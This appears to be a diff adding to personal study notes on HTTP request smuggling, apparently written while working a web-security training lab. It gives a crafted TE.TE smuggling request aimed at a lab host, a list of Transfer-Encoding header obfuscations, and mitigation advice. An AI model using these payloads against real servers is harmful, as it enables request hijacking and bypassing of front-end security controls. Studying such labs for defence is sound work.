@@ -98,4 +98,57 @@
             - Explanation:
                 The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server. The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
 
+        # -- TE.TE:
+             1. Crafting the malicious request
+                POST / HTTP/1.1\r\n
+                Host: ac441f821eea40e1c1d50fee0009007b.web-security-academy.net\r\n
+                Content-Type: application/x-www-form-urlencoded\r\n
+                Content-length: 4\r\n
+                Transfer-encoding: chunked\r\n
+                Transfer-encoding: x\r\n
+                \r\n
+                5c\r\n
+                GPOST / HTTP/1.1\r\n
+                Content-Type: application/x-www-form-urlencoded\r\n
+                Content-Length: 15\r\n
+                \r\n
+                x=1\r\n
+                0\r\n\r\n
+
+            - Explanation:
+                The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
+
+            - There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:
+
+            Transfer-Encoding: xchunked
+
+            Transfer-Encoding : chunked
+
+            Transfer-Encoding: chunked
+            Transfer-Encoding: x
+
+            Transfer-Encoding:[tab]chunked
+
+            [space]Transfer-Encoding: chunked
+
+            X: X[\n]Transfer-Encoding: chunked
+
+            Transfer-Encoding
+            : chunked
+
+
+    # -- Mitigation:
+        - HTTP request smuggling vulnerabilities arise in situations where the front-end server and back-end server use different mechanisms for determining the 
+        boundaries between requests. This may be due to discrepancies between whether HTTP/1 servers use the Content-Length header or chunked transfer encoding to 
+        determine where each request ends. In HTTP/2 environments, the common practice of downgrading HTTP/2 requests for the back-end is also fraught with 
+        issues and enables or simplifies a number of additional attacks. To prevent HTTP request smuggling vulnerabilities, we recommend taking the following 
+        general steps:
+            1. Use HTTP/2 end to end and disable HTTP downgrading if possible. HTTP/2 uses a robust mechanism for determining the length of requests and, when used 
+            end to end, is inherently protected against request smuggling. If you can't avoid HTTP downgrading, make sure you validate the rewritten request 
+            against the HTTP/1.1 specification. For example, reject requests that contain newlines in the headers, colons in header names, and spaces in the request 
+            method.
+            2. Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP 
+            connection in the process.
+
+
 # -------------------------------   end how to perform an HTTP smuggling attack ------------------------------- # 
